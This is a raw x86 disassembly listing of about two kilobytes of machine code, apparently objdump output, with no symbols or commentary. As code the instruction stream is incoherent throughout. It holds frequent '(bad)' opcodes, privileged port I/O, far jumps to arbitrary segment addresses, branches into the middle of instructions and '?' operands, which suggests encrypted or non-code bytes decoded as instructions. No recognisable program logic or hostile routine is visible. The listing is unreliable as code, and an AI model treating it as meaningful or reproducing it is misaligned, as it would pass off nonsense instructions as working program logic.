  412a8d:	pop    ss
  412a8e:	adc    eax,0xbebfc4c7
  412a93:	inc    ebx
  412a94:	mov    dh,0x8c
  412a96:	movaps xmm6,XMMWORD PTR [esi+0x25bdee87]
  412a9d:	call   0x32c3:0x5ef4a2bf
  412aa4:	inc    esp
  412aa5:	mov    DWORD PTR [edi-0x71],edi
  412aa8:	loop   0x412aa7
  412aaa:	sub    DWORD PTR [ecx],0x26
  412aad:	xor    al,0xbf
  412aaf:	xor    eax,0x8178f4f2
  412ab4:	push   ebp
  412ab5:	inc    ebp
  412ab6:	lahf   
  412ab7:	btc    DWORD PTR ds:0x268618a4,0x2a
  412abf:	lock rol BYTE PTR ds:0xbf4fb06e,cl
  412ac6:	sub    BYTE PTR [esi+0x46ed681a],bh
  412acc:	push   es
  412acd:	jl     0x412a74
  412acf:	mov    esp,ebp
  412ad1:	mov    ds:0xf55833e1,al
  412ad6:	xor    esp,DWORD PTR [edx+0x29d3e1c6]
  412adc:	pushf  
  412add:	lea    esi,[esi]
  412adf:	mov    BYTE PTR [esi-0x587a7557],dl
  412ae5:	fucomip st,st(0)
  412ae7:	pushf  
  412ae8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ae9:	pop    edi
  412aea:	enter  0xd176,0xfd
  412aee:	jns    0x412a77
  412af0:	pop    es
  412af1:	jno    0x412afe
  412af3:	imul   esi,edi,0x19
  412af6:	cwde   
  412af7:	fdiv   DWORD PTR [esi]
  412af9:	push   es
  412afa:	add    edx,DWORD PTR [ebp+0x4b]
  412afd:	push   cs
  412afe:	sub    esi,DWORD PTR [edx]
  412b00:	or     al,0x48
  412b02:	in     al,dx
  412b03:	mov    esp,0x4198380d
  412b08:	sub    ch,BYTE PTR [eax]
  412b0a:	mov    ebx,0x9990f8b2
  412b0f:	mov    ebx,0x4982cd83
  412b14:	std    
  412b15:	mov    bh,0x86
  412b17:	xchg   edi,eax
  412b18:	test   eax,0xefe9b10a
  412b1d:	cmp    DWORD PTR [ecx-0x67],edx
  412b20:	sub    ah,BYTE PTR [ebx+0x9873724]
  412b26:	dec    edx
  412b27:	xor    ebx,ebx
  412b29:	ror    BYTE PTR [edx+0x42],cl
  412b2c:	sub    al,0xda
  412b2e:	jae    0x412ad4
  412b30:	aam    0x26
  412b32:	icebp  
  412b33:	mov    ds:0xfd120cec,al
  412b38:	cmp    eax,0x8bcfe889
  412b3d:	fcmovu st,st(1)
  412b3f:	jns    0x412b14
  412b41:	imul   esp,ebx,0x2e
  412b44:	in     al,0xee
  412b46:	push   ebx
  412b47:	mov    ebx,0x57f0dd24
  412b4c:	je     0x412b5e
  412b4e:	adc    al,0x92
  412b50:	ret    0x3afb
  412b53:	pushf  
  412b54:	dec    esi
  412b55:	dec    edi
  412b56:	or     ebp,DWORD PTR [ecx]
  412b58:	frstpm(287 only) 
  412b5a:	xlat   BYTE PTR ds:[ebx]
  412b5b:	jmp    0xa6ca:0x65f8d6a5
  412b62:	jg     0x412b06
  412b64:	in     al,0x6b
  412b66:	cli    
  412b67:	cmp    al,0xab
  412b6a:	icebp  
  412b6b:	cs mov edx,0x9651d588
  412b71:	pop    ebx
  412b72:	inc    esi
  412b73:	das    
  412b74:	xor    BYTE PTR [ecx],ah
  412b76:	dec    ecx
  412b77:	jb     0x412b76
  412b79:	mov    esp,0x8711deb0
  412b7e:	arpl   WORD PTR [ebx+0x1252cba8],cx
  412b84:	add    esp,DWORD PTR [ebp+0xcee07b8]
  412b8a:	repnz (bad) 
  412b8c:	pushf  
  412b8d:	pop    ss
  412b8e:	pusha  
  412b8f:	test   al,0x3f
  412b91:	adc    al,0x5
  412b93:	xlat   BYTE PTR ds:[ebx]
  412b94:	sub    ah,cl
  412b96:	jno    0x412be1
  412b98:	jecxz  0x412b28
  412b9a:	inc    ebp
  412b9b:	mov    eax,0xcfc685a0
  412ba0:	push   cs
  412ba1:	xor    al,0x8b
  412ba3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ba4:	shl    dl,cl
  412ba6:	xor    dh,BYTE PTR [edx]
  412ba8:	cmp    DWORD PTR [eax+0x7dca51c],esp
  412bae:	cmp    eax,0xceb054e6
  412bb3:	lds    esp,FWORD PTR [edi-0x1ec968d]
  412bb9:	jnp    0x412beb
  412bbb:	push   ebx
  412bbc:	cmp    dl,BYTE PTR [ecx]
  412bbe:	cmp    eax,0xf9a805a0
  412bc3:	test   eax,0xadc11694
  412bc8:	repz sub ebp,DWORD PTR [ecx-0x7]
  412bcc:	jmp    0x556b0bfc
  412bd1:	xchg   esp,eax
  412bd2:	pop    esp
  412bd3:	aam    0xd9
  412bd5:	jnp    0x412bf1
  412bd7:	jl     0x412bd6
  412bd9:	outs   dx,BYTE PTR ds:[esi]
  412bda:	out    0x68,eax
  412bdc:	fidivr WORD PTR [ebx]
  412bde:	jns    0x412c10
  412be0:	pop    esi
  412be1:	sub    cl,BYTE PTR [ebp+0x25f4ce66]
  412be7:	jae    0x412c49
  412be9:	push   es
  412bea:	sbb    ecx,DWORD PTR [ebx+esi*8-0x12]
  412bee:	sub    dh,BYTE PTR [eax]
  412bf0:	daa    
  412bf1:	add    ebx,ebx
  412bf3:	add    eax,0x3a5d0183
  412bf8:	or     al,0x56
  412bfa:	pop    ds
  412bfb:	fs out dx,al
  412bfd:	pop    eax
  412bfe:	std    
  412bff:	jmp    0x412b97
  412c01:	jecxz  0x412c6a
  412c03:	test   DWORD PTR [edx],0xd5c042bd
  412c09:	lock sti 
  412c0b:	scas   al,BYTE PTR es:[edi]
  412c0c:	mov    eax,ds:0x7b70ffee
  412c11:	pusha  
  412c12:	ficomp DWORD PTR [ecx+0x38]
  412c15:	mov    bh,0x2b
  412c17:	pop    ss
  412c18:	or     ebx,edx
  412c1a:	mov    ecx,0xe94ea6db
  412c1f:	gs jp  0x412bd6
  412c22:	(bad)  [edx-0x7e]
  412c25:	xor    DWORD PTR [eax],ebp
  412c27:	mov    ah,bl
  412c29:	js     0x412c7e
  412c2b:	(bad)  
  412c2c:	aad    0xf4
  412c2e:	sub    eax,0x6c620bec
  412c33:	sahf   
  412c34:	dec    eax
  412c35:	mov    BYTE PTR [esi+ebx*2],bl
  412c38:	xchg   DWORD PTR [esi+0x62],ebx
  412c3b:	iret   
  412c3c:	(bad)  [edx]
  412c3e:	enter  0x56b6,0xd8
  412c42:	jns    0x412c36
  412c44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c45:	loope  0x412c73
  412c47:	and    al,0x75
  412c49:	adc    al,0x39
  412c4b:	bnd jae 0x412c68
  412c4e:	(bad)  
  412c4f:	stos   DWORD PTR es:[edi],eax
  412c50:	jmp    0x2c94:0x72576bac
  412c57:	stos   DWORD PTR es:[edi],eax
  412c58:	jae    0x412c18
  412c5a:	mov    dh,BYTE PTR [ecx]
  412c5c:	bound  edx,QWORD PTR [esp+ebx*1]
  412c5f:	jbe    0x412ca1
  412c61:	(bad)  
  412c62:	mov    dh,0x2b
  412c64:	(bad)  
  412c65:	xor    al,0x62
  412c67:	cli    
  412c68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c69:	jmp    0xbd4a2db4
  412c6e:	outs   dx,DWORD PTR ds:[esi]
  412c6f:	in     al,dx
  412c70:	jnp    0x412c99
  412c72:	jb     0x412c14
  412c74:	outs   dx,DWORD PTR ds:[esi]
  412c75:	xor    bl,dl
  412c77:	cs in  al,0xb1
  412c7a:	xor    edx,DWORD PTR [esp+eiz*4]
  412c7d:	push   cs
  412c7e:	push   edi
  412c7f:	or     ecx,DWORD PTR [ecx+0x7f]
  412c82:	xchg   ecx,eax
  412c83:	ins    DWORD PTR es:[edi],dx
  412c84:	adc    DWORD PTR [ebx-0x57],0xffffffd3
  412c88:	in     al,0xfd
  412c8a:	jmp    0x1067:0x60de77ed
  412c91:	popf   
  412c92:	jmp    0x1756:0x9a2fed43
  412c99:	dec    ebx
  412c9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c9b:	sbb    al,0x8c
  412c9d:	mov    al,ds:0x54eee088
  412ca2:	or     DWORD PTR [edx+0x14687d7a],ebx
  412ca8:	jmp    0x412d0a
  412caa:	jne    0x412d14
  412cac:	xchg   DWORD PTR [edx+0x56],edi
  412caf:	mov    edi,0xb6ab6243
  412cb4:	retf   
  412cb5:	enter  0x9afb,0x97
  412cb9:	push   0xc738aad3
  412cbe:	fisub  WORD PTR [eax+eiz*1+0x23]
  412cc2:	dec    edi
  412cc3:	push   0xac3097ba
  412cc8:	pop    esp
  412cc9:	cmp    dl,BYTE PTR [ecx+0x2459bb4d]
  412ccf:	mov    eax,fs
  412cd1:	adc    edi,ecx
  412cd3:	in     eax,dx
  412cd4:	or     ch,0xfd
  412cd7:	pop    edx
  412cd8:	jbe    0x412c72
  412cda:	pcmpgtd mm1,QWORD PTR [edi+0x15]
  412cde:	std    
  412cdf:	cdq    
  412ce0:	pop    esi
  412ce1:	xor    al,0x26
  412ce3:	popf   
  412ce4:	fist   DWORD PTR [edx-0x36b4445a]
  412cea:	push   ecx
  412ceb:	sub    BYTE PTR [ecx+0x138d60d8],cl
  412cf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cf2:	inc    ebx
  412cf3:	ret    0x6e75
  412cf6:	cmp    BYTE PTR [ebp+0x70af15ac],bh
  412cfc:	pop    esi
  412cfd:	cmp    al,0x22
  412cff:	lods   eax,DWORD PTR ds:[esi]
  412d00:	popa   
  412d01:	in     al,dx
  412d02:	in     al,dx
  412d03:	retf   
  412d04:	mov    edi,0x111c061d
  412d09:	sub    DWORD PTR [edx+edx*2-0x4b8105fb],esi
  412d10:	inc    eax
  412d11:	inc    edx
  412d12:	add    BYTE PTR [ecx],0xe7
  412d15:	out    0x1c,al
  412d17:	fucomip st,st(2)
  412d19:	fwait
  412d1a:	xchg   ebp,eax
  412d1b:	stos   DWORD PTR es:[edi],eax
  412d1c:	or     BYTE PTR [esi+0x37],bh
  412d1f:	mov    eax,ds:0xeada276
  412d24:	mov    eax,ds:0xeba7ae18
  412d29:	mov    edx,0xa9b97311
  412d2e:	jo     0x412d52
  412d30:	in     eax,0x31
  412d32:	sub    eax,DWORD PTR [ecx-0x599defc0]
  412d38:	inc    ecx
  412d39:	cwde   
  412d3a:	xchg   edx,eax
  412d3b:	das    
  412d3c:	popf   
  412d3d:	lahf   
  412d3e:	mov    dl,0xc3
  412d40:	inc    ebx
  412d41:	jno    0x412cfb
  412d43:	out    dx,eax
  412d44:	fwait
  412d45:	cs mov ebx,0xc4648344
  412d4b:	push   ds
  412d4c:	mov    ebx,0x364cf900
  412d51:	fisttp QWORD PTR [edi+0x54]
  412d54:	sbb    bh,bl
  412d56:	mov    ah,0xd8
  412d58:	mov    bh,0xf4
  412d5a:	pop    edi
  412d5b:	dec    ebx
  412d5c:	ret    0xa6c6
  412d5f:	call   0xff5945d0
  412d64:	das    
  412d65:	test   DWORD PTR [eax],ebp
  412d67:	and    esp,eax
  412d69:	lods   eax,DWORD PTR ds:[esi]
  412d6a:	or     al,0x57
  412d6c:	dec    esi
  412d6d:	data16 fidivr WORD PTR [ecx+0x77]
  412d71:	not    bl
  412d73:	sar    DWORD PTR [eax+0x61],cl
  412d76:	fidivr DWORD PTR [ebx+0x2e]
  412d79:	dec    edx
  412d7a:	loope  0x412d36
  412d7c:	jg     0x412dd7
  412d7e:	fldenv [ebx-0x4f504d52]
  412d84:	pusha  
  412d85:	inc    ebp
  412d86:	shr    DWORD PTR ds:0xd885f1d,1
  412d8c:	test   eax,0xf5025355
  412d91:	push   esp
  412d92:	mov    al,ds:0x41b9d879
  412d97:	mov    ecx,0xa95fd2
  412d9c:	fisubr WORD PTR [esi]
  412d9e:	push   es
  412d9f:	pop    esp
  412da0:	xchg   BYTE PTR [ecx],bh
  412da2:	adc    DWORD PTR [edx+ecx*4+0x8],ebp
  412da6:	sub    edi,esi
  412da8:	mov    esi,0xb270dadb
  412dad:	arpl   WORD PTR [ecx],bx
  412daf:	mov    al,ds:0xc9d6c256
  412db4:	out    0xe9,eax
  412db6:	cmp    bh,BYTE PTR [edx+eiz*4]
  412db9:	in     eax,0x37
  412dbb:	sbb    cl,BYTE PTR [esi]
  412dbd:	cld    
  412dbe:	or     BYTE PTR [edi+0x76],bl
  412dc1:	inc    esp
  412dc2:	scas   eax,DWORD PTR es:[edi]
  412dc3:	neg    DWORD PTR [edi]
  412dc5:	cld    
  412dc6:	dec    ecx
  412dc7:	mov    ds:0x1421ca27,eax
  412dcc:	es test al,0x66
  412dcf:	or     edx,DWORD PTR [edx]
  412dd1:	and    eax,0xca369cfc
  412dd6:	jmp    DWORD PTR [edi]
  412dd8:	sub    DWORD PTR es:[ebx],esi
  412ddb:	aaa    
  412ddc:	and    BYTE PTR [edi+0x5988fa66],cl
  412de2:	xor    eax,0xbee25ac6
  412de7:	stos   DWORD PTR es:[edi],eax
  412de8:	cmp    DWORD PTR [ebp+0x5d21c041],ebx
  412dee:	push   ebp
  412def:	fild   WORD PTR [ebp+0x5e0f6962]
  412df5:	sbb    al,0x64
  412df7:	fisttp WORD PTR [eax+0x4d]
  412dfa:	add    DWORD PTR [edx-0x50a56551],esp
  412e00:	jle    0x412df0
  412e02:	cmp    BYTE PTR [edx+ebx*8+0x2c2261d2],cl
  412e09:	or     al,0x55
  412e0b:	shl    BYTE PTR [eax-0x6e6f707c],0x9
  412e12:	call   DWORD PTR [edi-0x6d83318]
  412e18:	mov    esi,0x48079679
  412e1d:	xchg   BYTE PTR [edi-0x5a],dh
  412e20:	mov    bl,0xf8
  412e22:	ret    
  412e23:	jnp    0x412dda
  412e25:	cmp    eax,0xb2d83a75
  412e2a:	loopne 0x412e3a
  412e2c:	and    esi,0x28639a9b
  412e32:	push   cs
  412e33:	ret    
  412e34:	adc    dh,al
  412e36:	outs   dx,BYTE PTR ds:[esi]
  412e37:	xor    ebx,DWORD PTR [edi-0xf]
  412e3a:	dec    edx
  412e3b:	shl    DWORD PTR [esi],1
  412e3d:	cmp    dl,BYTE PTR [ebp+edx*2+0x13e87e6c]
  412e44:	xchg   edi,eax
  412e45:	push   0xf
  412e47:	loop   0x412e4b
  412e49:	sub    BYTE PTR [ebx-0x41],bl
  412e4c:	lods   al,BYTE PTR ds:[esi]
  412e4d:	data16 jne 0x412de5
  412e50:	mov    bl,0xd0
  412e52:	cmp    eax,0x8bb0e5a4
  412e57:	mov    ah,0x83
  412e59:	inc    esp
  412e5a:	popa   
  412e5b:	mov    DWORD PTR [ecx],ebx
  412e5d:	aad    0x28
  412e5f:	into   
  412e60:	push   ebx
  412e61:	fdiv   DWORD PTR [eax+0x77]
  412e64:	jnp    0x412e41
  412e66:	cmp    al,0xa9
  412e68:	xor    BYTE PTR [esi+esi*1],al
  412e6b:	ja     0x412e82
  412e6d:	xchg   ebp,eax
  412e6e:	xchg   ebp,eax
  412e6f:	dec    ebp
  412e70:	push   esp
  412e71:	test   eax,0xc6d3afa
  412e76:	gs pop eax
  412e78:	add    DWORD PTR [ebx],esi
  412e7a:	scas   eax,DWORD PTR es:[edi]
  412e7b:	lea    esp,[ecx+0x2b51530e]
  412e81:	out    dx,eax
  412e82:	mov    ebx,0xa666b4c2
  412e87:	call   0x78d49ba2
  412e8c:	jp     0x412e80
  412e8e:	in     eax,0xb4
  412e90:	mov    ds:0xdf2bfe8e,eax
  412e95:	xor    dl,BYTE PTR [edx]
  412e97:	xor    eax,0xc75fe546
  412e9c:	jbe    0x412e4a
  412e9e:	xor    esp,ecx
  412ea0:	arpl   WORD PTR [edx+eiz*1-0x6c],di
  412ea4:	xor    esi,DWORD PTR [ebx-0x79da745e]
  412eaa:	xchg   edx,eax
  412eab:	push   edi
  412eac:	scas   al,BYTE PTR es:[edi]
  412ead:	clc    
  412eae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412eaf:	ins    BYTE PTR es:[edi],dx
  412eb0:	jg     0x412e3e
  412eb2:	imul   edx,edi,0x53fc8ce
  412eb8:	mov    eax,ds:0x885fee3a
  412ebd:	mov    ch,0x6
  412ebf:	pop    ebp
  412ec0:	push   esi
  412ec1:	iret   
  412ec2:	cdq    
  412ec3:	push   0x92a8e859
  412ec8:	sub    al,BYTE PTR [ebx]
  412eca:	inc    eax
  412ecb:	bound  esp,QWORD PTR [eax-0x34f13c58]
  412ed1:	or     al,bh
  412ed3:	inc    esp
  412ed4:	dec    eax
  412ed5:	sub    al,0x3c
  412ed7:	out    dx,eax
  412ed8:	or     eax,0xf748c5ec
  412edd:	push   edx
  412ede:	mov    eax,ds:0xbfcbbc7
  412ee3:	ficomp WORD PTR [edi+edx*1-0x1741bc93]
  412eea:	xor    DWORD PTR [ebp+0x6b],0xffffffe6
  412eee:	or     edi,DWORD PTR [edi-0x79]
  412ef1:	cmp    eax,0xbc002e0a
  412ef6:	cmp    al,0xdb
  412ef8:	leave  
  412ef9:	out    dx,eax
  412efa:	loopne 0x412f4e
  412efc:	or     al,cl
  412efe:	jg     0x412e8f
  412f00:	pusha  
  412f01:	fucomi st,st(6)
  412f03:	outs   dx,DWORD PTR ds:[esi]
  412f04:	ficomp WORD PTR [edx]
  412f06:	push   esi
  412f07:	and    bl,dh
  412f09:	and    DWORD PTR [edx+0xf7c4c71],ecx
  412f0f:	and    DWORD PTR [edx+0x38],ecx
  412f12:	lods   al,BYTE PTR ds:[esi]
  412f13:	sub    al,0x18
  412f15:	scas   eax,DWORD PTR es:[edi]
  412f16:	xchg   ebp,eax
  412f17:	jae    0x412f7e
  412f19:	and    al,0xfd
  412f1b:	inc    ecx
  412f1c:	call   0xd1e5:0xc501c650
  412f23:	mov    eax,0x19aa8bb2
  412f28:	inc    esp
  412f29:	sahf   
  412f2a:	jl     0x412ee8
  412f2c:	das    
  412f2d:	mov    ds:0x83a4ae17,eax
  412f32:	gs or  eax,0x73a0bfdf
  412f38:	fstp   QWORD PTR [edi]
  412f3a:	push   cs
  412f3b:	mov    WORD PTR [ebp+esi*8+0x50],gs
  412f3f:	ins    BYTE PTR es:[edi],dx
  412f40:	int3   
  412f41:	xchg   esi,eax
  412f42:	add    esp,DWORD PTR [ebx+0x6c]
  412f45:	inc    ebp
  412f46:	sbb    DWORD PTR [esi],ebp
  412f48:	call   0xd895:0xa8732fc8
  412f4f:	cmp    DWORD PTR [eax-0x73f72573],eax
  412f55:	retf   0x7a5d
  412f58:	sbb    BYTE PTR [esi+0x53],dh
  412f5b:	push   es
  412f5c:	fadd   DWORD PTR [ebx-0x4656bc20]
  412f62:	inc    esi
  412f63:	shl    BYTE PTR [ebx+0x5d00c361],0xfb
  412f6a:	add    al,0x88
  412f6c:	stos   DWORD PTR es:[edi],eax
  412f6d:	push   edi
  412f6e:	icebp  
  412f6f:	mov    bl,0xea
  412f71:	ror    BYTE PTR [ecx+0x4b],0x7a
  412f75:	(bad)  
  412f76:	adc    al,0xfe
  412f78:	sub    al,BYTE PTR [ebx-0x5ed71a8f]
  412f7e:	rcl    BYTE PTR [edi],1
  412f80:	ss mov ebx,0x474c7f55
  412f86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f87:	imul   edi,DWORD PTR [edi+ecx*2+0x26eb8905],0xffffffb2
  412f8f:	test   DWORD PTR [eax-0x6c],edi
  412f92:	mov    ss,WORD PTR [ebp-0x26]
  412f95:	out    0x87,eax
  412f97:	xchg   edi,eax
  412f98:	mov    eax,ds:0x3834a6f7
  412f9d:	popa   
  412f9e:	push   ecx
  412f9f:	fdivr  st(0),st
  412fa1:	add    BYTE PTR [ebp-0x78],ah
  412fa4:	jnp    0x412ffe
  412fa6:	mov    bh,0xae
  412fa8:	or     BYTE PTR [ebx-0x20a92cb4],al
  412fae:	rcr    BYTE PTR [esi-0x6f],cl
  412fb1:	add    al,0x8a
  412fb3:	in     al,dx
  412fb4:	stc    
  412fb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fb6:	add    ebp,DWORD PTR [edx+0x1306da94]
  412fbc:	sbb    bl,BYTE PTR [edi-0x38]
  412fbf:	in     al,dx
  412fc0:	stos   BYTE PTR es:[edi],al
  412fc1:	mov    eax,0x4f24680c
  412fc6:	mov    bh,0xfc
  412fc8:	shl    ebx,cl
  412fca:	out    0x2d,al
  412fcc:	sub    edx,DWORD PTR [eax]
  412fce:	mov    ds:0x111ecb1a,eax
  412fd3:	sti    
  412fd4:	nop
  412fd5:	stos   BYTE PTR es:[edi],al
  412fd6:	sahf   
  412fd7:	lahf   
  412fd8:	dec    ebp
  412fd9:	(bad)  
  412fda:	pop    edx
  412fdb:	add    bh,BYTE PTR [esi+eax*8+0x63]
  412fdf:	sbb    eax,0x921b731d
  412fe4:	xchg   esp,eax
  412fe5:	(bad)  
  412fe6:	sti    
  412fe7:	xchg   edx,eax
  412fe8:	div    DWORD PTR [edx+edx*1]
  412feb:	inc    ebx
  412fec:	mov    ss,WORD PTR [ecx]
  412fee:	(bad)  
  412fef:	call   FWORD PTR [ecx+esi*2-0x34ea93e3]
  412ff6:	dec    esi
  412ff7:	pop    ebx
  412ff8:	out    dx,eax
  412ff9:	ror    DWORD PTR [edi-0x78702ccc],0x58
  413000:	xchg   BYTE PTR [ebx],ah
  413002:	ret    
  413003:	bound  ebp,QWORD PTR [esi+0x53]
  413006:	push   cs
  413007:	lods   al,BYTE PTR ds:[esi]
  413008:	jmp    0x2d26dae7
  41300d:	jbe    0x412ffb
  41300f:	(bad)
  413012:	ins    BYTE PTR es:[edi],dx
  413013:	out    dx,al
  413014:	mov    ?,WORD PTR [edx+0x365b29eb]
  41301a:	arpl   WORD PTR [esp+edi*1+0x6c4aaab8],ax
  413021:	xor    BYTE PTR [ecx-0x21],dh
  413024:	cmp    esp,0x4aaf7825
  41302a:	inc    DWORD PTR [ebx]
  41302c:	inc    eax
  41302d:	gs into 
  41302f:	pop    edx
  413030:	addr16 pop esp
  413032:	out    dx,al
  413033:	fs stc 
  413035:	cs aas 
  413037:	mov    al,0x29
  413039:	lods   al,BYTE PTR ds:[esi]
  41303a:	mov    ch,0x3a
  41303c:	sti    
  41303d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41303e:	shl    BYTE PTR [esi],cl
  413040:	dec    edx
  413041:	sub    ecx,edx
  413043:	sar    DWORD PTR [eax-0x2b],0x57
  413047:	mov    eax,ds:0x6c4c87cd
  41304c:	pop    ebx
  41304d:	push   esp
  41304e:	scas   eax,DWORD PTR es:[edi]
  41304f:	mov    DWORD PTR [edx-0x61],edx
  413052:	sub    eax,0x9001276
  413057:	in     eax,0x3e
  413059:	hlt    
  41305a:	push   cs
  41305b:	cmc    
  41305c:	or     ch,BYTE PTR [bx+si-0x6ced]
  413061:	cmp    cl,BYTE PTR [ebx-0x35]
  413064:	mov    es,esp
  413066:	sti    
  413067:	popf   
  413068:	jno    0x413059
  41306a:	xchg   ebx,eax
  41306b:	push   ss
  41306c:	push   0x83268d05
  413071:	xchg   ebx,eax
  413072:	add    dl,BYTE PTR [eax+esi*2]
  413075:	aam    0xa3
  413077:	fild   WORD PTR [ebp+0x707e4ddd]
  41307d:	add    ax,0xd5bf
  413081:	bound  edx,QWORD PTR [edx+0x218db71]
  413087:	pop    edi
  413088:	cmp    DWORD PTR [edx-0x1f],0x69fb0bd1
  41308f:	(bad)  
  413090:	xlat   BYTE PTR ds:[ebx]
  413091:	pop    esp
  413092:	hlt    
  413093:	xor    al,0x7e
  413095:	lea    esi,[ecx+0x5e64348c]
  41309b:	mov    esi,0x5eec6f39
  4130a0:	fxch   st(2)
  4130a2:	stos   BYTE PTR es:[edi],al
  4130a3:	shl    DWORD PTR [eax],0xcf
  4130a6:	int3   
  4130a7:	add    al,0xaa
  4130a9:	call   FWORD PTR [eax+edx*2+0x44]
  4130ad:	add    DWORD PTR [edx+0x3d],edx
  4130b0:	xor    eax,0xd4e0ecc9
  4130b5:	es scas eax,DWORD PTR es:[edi]
  4130b7:	or     DWORD PTR [edx],ebx
  4130b9:	pop    es
  4130ba:	jbe    0x413081
  4130bc:	and    al,0x23
  4130be:	sub    al,0xaa
  4130c0:	aas    
  4130c1:	out    dx,eax
  4130c2:	ror    DWORD PTR [esi],cl
  4130c4:	data16 lahf 
  4130c6:	inc    edx
  4130c7:	call   0xae4e:0xdb4e0d0a
  4130ce:	adc    edi,DWORD PTR [edx]
  4130d0:	sub    ebx,DWORD PTR [ebp+0x74119e61]
  4130d6:	test   dl,0x43
  4130d9:	xchg   ah,ah
  4130db:	adc    ecx,esi
  4130dd:	sar    BYTE PTR [ebx],cl
  4130df:	popa   
  4130e0:	push   es
  4130e1:	inc    ebp
  4130e2:	pop    es
  4130e3:	aam    0x52
  4130e5:	daa    
  4130e6:	jl     0x413132
  4130e8:	push   eax
  4130e9:	sbb    eax,0x2e6c35f1
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	aas    
  4130f0:	add    eax,0x1f4d2212
  4130f5:	and    BYTE PTR ds:0x65dad0e0,bl
  4130fb:	mov    dl,0x9e
  4130fd:	and    DWORD PTR [ebx+0x61a915c5],ecx
  413103:	or     DWORD PTR [edx],esp
  413105:	ret    
  413106:	xlat   BYTE PTR ds:[ebx]
  413107:	or     esi,esp
  413109:	cmp    eax,0xc584e942
  41310e:	std    
  41310f:	mov    ss,WORD PTR [eax]
  413111:	dec    edi
  413112:	loope  0x41315c
  413114:	push   edx
  413115:	sbb    al,0x90
  413117:	loopne 0x413108
  413119:	sub    eax,0x10108e64
  41311e:	in     eax,dx
  41311f:	mov    edi,0xf0620567
  413124:	jne    0x413194
  413126:	aam    0xae
  413128:	scas   eax,DWORD PTR es:[edi]
  413129:	fcomp  DWORD PTR [ecx]
  41312b:	dec    ecx
  41312c:	les    esp,FWORD PTR [ebx+0x40]
  41312f:	push   0x20cb7ffc
  413134:	data16 cld 
  413136:	or     eax,0xb9f1e8d2
  41313b:	xlat   BYTE PTR ds:[ebx]
  41313c:	in     eax,0xfa
  41313e:	fidiv  DWORD PTR [edi]
  413140:	hlt    
  413141:	jbe    0x4131c0
  413143:	xchg   edx,eax
  413144:	pop    esi
  413145:	xchg   ecx,eax
  413146:	mov    ch,0x82
  413148:	aas    
  413149:	pop    ebx
  41314a:	pop    ds
  41314b:	cmp    DWORD PTR [edi],ebp
  41314d:	add    BYTE PTR [edx],cl
  41314f:	sbb    al,0x6e
  413151:	imul   esp,edi,0x44a07d74
  413157:	mov    BYTE PTR [edi-0x3a226bd8],ch
  41315d:	mov    ebp,0xbbf41197
  413162:	jns    0x413117
  413164:	mov    ds:0xb8db1c09,eax
  413169:	push   ds
  41316a:	rcl    BYTE PTR ds:0x6cbc183f,0xcd
  413171:	adc    al,0x25
  413173:	dec    ch
  413175:	aad    0xbb
  413177:	std    
  413178:	jge    0x4131c0
  41317a:	loop   0x413139
  41317c:	call   0xfd0bf3b6
  413181:	inc    ecx
  413182:	loop   0x4131fd
  413184:	push   ebx
  413185:	inc    bx
  413187:	cmc    
  413188:	lahf   
  413189:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41318a:	cmp    ah,al
  41318c:	or     BYTE PTR [esi],0xa8
  41318f:	xchg   esi,eax
  413190:	(bad)  
  413192:	sar    cl,0xd4
  413195:	mov    bh,0xb2
  413197:	mov    BYTE PTR [edi],ah
  413199:	ds sub al,0x72
  41319c:	jno    0x413176
  41319e:	in     eax,dx
  41319f:	inc    ebx
  4131a0:	fwait
  4131a1:	sbb    eax,0x438fed42
  4131a6:	push   es
  4131a7:	mov    ch,al
  4131a9:	cs pop esi
  4131ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131ad:	ins    BYTE PTR es:[edi],dx
  4131ae:	stc    
  4131af:	sub    bh,dl
  4131b1:	xchg   esp,eax
  4131b2:	gs mov edi,0xd059ea9c
  4131b8:	jge    0x41321c
  4131ba:	sbb    bh,0x64
  4131bd:	adc    DWORD PTR [ebx-0x1b],edi
  4131c0:	xor    DWORD PTR [ebp-0x57],eax
  4131c3:	sar    BYTE PTR [edi+0x24],0x5d
  4131c7:	mov    WORD PTR [edx],?
  4131c9:	icebp  
  4131ca:	jne    0x413214
  4131cc:	sahf   
  4131cd:	lods   al,BYTE PTR ds:[esi]
  4131ce:	imul   esi,DWORD PTR [esi],0x703d6298
  4131d4:	or     eax,0xb74423
  4131d9:	xchg   BYTE PTR [edi],cl
  4131db:	ds mov bl,0x35
  4131de:	xchg   esi,eax
  4131df:	and    BYTE PTR [esi+0x62b10574],dh
  4131e5:	pop    ds
  4131e6:	fisub  WORD PTR [edi+edx*4-0x36d8476e]
  4131ed:	inc    eax
  4131ee:	repz xchg ebp,eax
  4131f0:	lock mov bl,0x7f
  4131f3:	in     al,dx
  4131f4:	pop    es
  4131f5:	lods   eax,DWORD PTR ds:[esi]
  4131f6:	mov    bh,0xe
  4131f8:	dec    eax
  4131f9:	push   ds
  4131fa:	and    al,BYTE PTR [ebp+0x2d485836]
  413200:	mov    eax,0xd1fcdeae
  413205:	popa   
  413206:	ret    0xbe60
  413209:	mov    dl,0xff
  41320b:	dec    ebp
  41320c:	outs   dx,BYTE PTR ds:[esi]
  41320d:	and    ch,BYTE PTR [esi+ecx*1]
  413210:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413211:	jl     0x41325d
  413213:	pop    esp
  413214:	sar    DWORD PTR [edi+0x41a4a68b],cl
  41321a:	ret    
  41321b:	aaa    
  41321c:	iret   
  41321d:	arpl   WORD PTR [edx-0x49],si
  413220:	cmp    ebx,ecx
  413222:	repz (bad) 
  413225:	mov    WORD PTR [eax+0xaf28323],gs
